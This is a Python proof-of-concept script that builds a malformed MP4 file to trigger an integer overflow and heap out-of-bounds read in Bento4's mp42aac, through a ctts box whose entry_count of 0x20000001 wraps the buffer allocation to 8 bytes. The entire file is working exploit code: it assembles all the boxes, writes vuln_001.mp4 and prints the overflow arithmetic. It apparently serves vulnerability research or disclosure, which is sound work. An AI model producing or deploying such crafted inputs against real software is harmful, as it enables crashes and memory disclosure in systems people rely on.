#!/usr/bin/env python3
"""
PoC Generator for VULN 001 — AP4_CttsAtom Integer Overflow -> Heap OOB Read
Target: Bento4 mp42aac
Vulnerability: Ap4CttsAtom.cpp lines 77-97

entry_count = 0x20000001
  entry_count * 8 (as AP4_UI32 32-bit) = 0x100000008 mod 2^32 = 8
  => buffer = new unsigned char[8]   (8 bytes allocated)
  => stream.Read(buffer, 8)          (reads 8 bytes we provide)
  => loop runs 0x20000001 = 536870913 times
  => i=0: buffer[0], buffer[4] -> OK
  => i=1: buffer[8]            -> HEAP BUFFER OVERFLOW (ASAN)
"""
import struct
import os

def make_box(fourcc, data):
    """Plain box: size(4) + type(4) + data"""
    assert len(fourcc) == 4, f"fourcc must be 4 bytes, got {len(fourcc)}"
    size = 8 + len(data)
    return struct.pack('>I4s', size, fourcc) + data

def make_fullbox(fourcc, version, flags, data):
    """Full box: size(4) + type(4) + version(1) + flags(3) + data"""
    assert len(fourcc) == 4
    vf = struct.pack('>BBBB',
                     version,
                     (flags >> 16) & 0xFF,
                     (flags >> 8)  & 0xFF,
                     flags & 0xFF)
    size = 12 + len(data)
    return struct.pack('>I4s', size, fourcc) + vf + data

# Standard 3x3 identity matrix for QuickTime/MP4 (36 bytes)
IDENTITY_MATRIX = struct.pack('>9I',
    0x00010000, 0x00000000, 0x00000000,
    0x00000000, 0x00010000, 0x00000000,
    0x00000000, 0x00000000, 0x40000000)

# ── ftyp ─────────────────────────────────────────────────────────────────────
ftyp_data = (struct.pack('>4sI', b'isom', 0x00000200)  # major_brand, minor_version
             + b'isom' + b'iso2' + b'mp41')            # compatible_brands
ftyp = make_box(b'ftyp', ftyp_data)

# ── mvhd (version 0, content = 96 bytes) ─────────────────────────────────────
# creation_time(4) modification_time(4) timescale(4) duration(4) rate(4)
# volume(2) reserved(2) reserved(8) matrix(36) pre_defined(24) next_track_ID(4)
mvhd_data  = struct.pack('>IIIII', 0, 0, 1000, 0, 0x00010000)  # 20 bytes
mvhd_data += struct.pack('>H', 0x0100)                          # volume  2 bytes
mvhd_data += b'\x00' * 10                                       # reserved 10 bytes
mvhd_data += IDENTITY_MATRIX                                    # matrix  36 bytes
mvhd_data += b'\x00' * 24                                       # pre_defined 24 bytes
mvhd_data += struct.pack('>I', 2)                               # next_track_ID 4 bytes
assert len(mvhd_data) == 96, f"mvhd data length: {len(mvhd_data)}"
mvhd = make_fullbox(b'mvhd', 0, 0, mvhd_data)

# ── tkhd (version 0, content = 80 bytes) ─────────────────────────────────────
# creation_time(4) modification_time(4) track_ID(4) reserved(4) duration(4)
# reserved(8) layer(2) alternate_group(2) volume(2) reserved(2) matrix(36)
# width(4) height(4)
tkhd_data  = struct.pack('>IIIII', 0, 0, 1, 0, 0)  # 20 bytes
tkhd_data += b'\x00' * 8                             # reserved 8 bytes
tkhd_data += struct.pack('>hhhh', 0, 0, 0, 0)       # layer, alt_group, volume, reserved 8 bytes
tkhd_data += IDENTITY_MATRIX                         # matrix 36 bytes
tkhd_data += struct.pack('>II', 0, 0)               # width, height 8 bytes
assert len(tkhd_data) == 80, f"tkhd data length: {len(tkhd_data)}"
tkhd = make_fullbox(b'tkhd', 0, 3, tkhd_data)       # flags=3: enabled + in_movie

# ── mdhd (version 0, content = 20 bytes) ─────────────────────────────────────
# creation_time(4) modification_time(4) timescale(4) duration(4)
# language(2) pre_defined(2)
mdhd_data = struct.pack('>IIIIHH', 0, 0, 1000, 0, 0, 0)
assert len(mdhd_data) == 20
mdhd = make_fullbox(b'mdhd', 0, 0, mdhd_data)

# ── hdlr ──────────────────────────────────────────────────────────────────────
# pre_defined(4) handler_type(4) reserved(12) name(n)
hdlr_data = struct.pack('>I4s', 0, b'soun') + b'\x00' * 12 + b'Sound\x00'
hdlr = make_fullbox(b'hdlr', 0, 0, hdlr_data)

# ── smhd ──────────────────────────────────────────────────────────────────────
smhd_data = struct.pack('>HH', 0, 0)   # balance, reserved
smhd = make_fullbox(b'smhd', 0, 0, smhd_data)

# ── dinf / dref / url ────────────────────────────────────────────────────────
# url entry: size(4) + 'url '(4) + version(1) + flags(3)
# flags = 0x000001 means self-contained (no actual URL string)
url_entry  = struct.pack('>I4sBBBB', 12, b'url ', 0, 0, 0, 1)
dref_data  = struct.pack('>I', 1) + url_entry   # entry_count=1 + url
dref       = make_fullbox(b'dref', 0, 0, dref_data)
dinf       = make_box(b'dinf', dref)

# ── stbl sub-boxes ────────────────────────────────────────────────────────────
stsd = make_fullbox(b'stsd', 0, 0, struct.pack('>I', 0))          # no entries
stts = make_fullbox(b'stts', 0, 0, struct.pack('>I', 0))          # no entries
stsc = make_fullbox(b'stsc', 0, 0, struct.pack('>I', 0))          # no entries
stsz = make_fullbox(b'stsz', 0, 0, struct.pack('>II', 0, 0))      # sample_size=0, count=0
stco = make_fullbox(b'stco', 0, 0, struct.pack('>I', 0))          # no entries

# ── ctts  ─── THE MALICIOUS BOX ──────────────────────────────────────────────
#
# entry_count = 0x20000001
# In AP4_CttsAtom constructor (Ap4CttsAtom.cpp line 80):
#   new unsigned char[entry_count * 8]
# Because entry_count is AP4_UI32:
#   0x20000001 * 8 = 0x100000008  -->  truncated to 8  (32-bit wrap-around)
# So only 8 bytes are allocated.
#
# We include 8 bytes of dummy data so stream.Read(buffer, 8) succeeds.
# Then the loop runs 0x20000001 times:
#   i=0: buffer[0], buffer[4]  -- within bounds
#   i=1: buffer[8]             -- HEAP BUFFER OVERFLOW caught by ASAN
#
ENTRY_COUNT = 0x20000001
DUMMY_DATA  = b'\x00' * 8   # 8 bytes so the Read() doesn't fail immediately
ctts_data   = struct.pack('>I', ENTRY_COUNT) + DUMMY_DATA
ctts        = make_fullbox(b'ctts', 0, 0, ctts_data)

# ── assemble ──────────────────────────────────────────────────────────────────
stbl = make_box(b'stbl', stsd + stts + stsc + stsz + stco + ctts)
minf = make_box(b'minf', smhd + dinf + stbl)
mdia = make_box(b'mdia', mdhd + hdlr + minf)
trak = make_box(b'trak', tkhd + mdia)
moov = make_box(b'moov', mvhd + trak)

mp4_bytes = ftyp + moov

# ── write output ──────────────────────────────────────────────────────────────
poc_dir     = os.path.dirname(os.path.abspath(__file__))
output_path = os.path.join(poc_dir, 'vuln_001.mp4')

with open(output_path, 'wb') as f:
    f.write(mp4_bytes)

overflow_result = (ENTRY_COUNT * 8) & 0xFFFFFFFF
print(f"[+] Written: {output_path} ({len(mp4_bytes)} bytes)")
print(f"[+] ctts entry_count   = 0x{ENTRY_COUNT:08X}  ({ENTRY_COUNT})")
print(f"[+] entry_count * 8    = 0x{ENTRY_COUNT * 8:016X}")
print(f"[+] ... mod 2^32       = {overflow_result}  (buffer size allocated)")
print(f"[+] Loop iteration 0 : buffer[0], buffer[4]  -- OK")
print(f"[+] Loop iteration 1 : buffer[8]              -- HEAP OOB (ASAN)")
